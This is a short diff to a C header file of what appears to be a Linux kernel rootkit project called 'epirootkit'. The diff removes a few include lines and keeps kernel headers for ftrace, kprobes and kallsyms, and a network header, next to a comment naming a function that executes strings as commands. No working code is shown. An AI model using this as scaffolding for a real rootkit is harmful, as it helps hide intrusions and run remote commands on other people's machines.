@@ -1,22 +1,18 @@
 #ifndef EPIROOTKIT_H
 #define EPIROOTKIT_H
 
-#include <linux/errno.h>
 #include <linux/fs.h>
 #include <linux/ftrace.h>
 #include <linux/init.h>
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
 #include <linux/kprobes.h>
-#include <linux/kthread.h>
-#include <linux/module.h>
 #include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/spinlock.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
 
-#include "config.h"
 #include "network.h"
 
 // Used by exec_str_as_command 
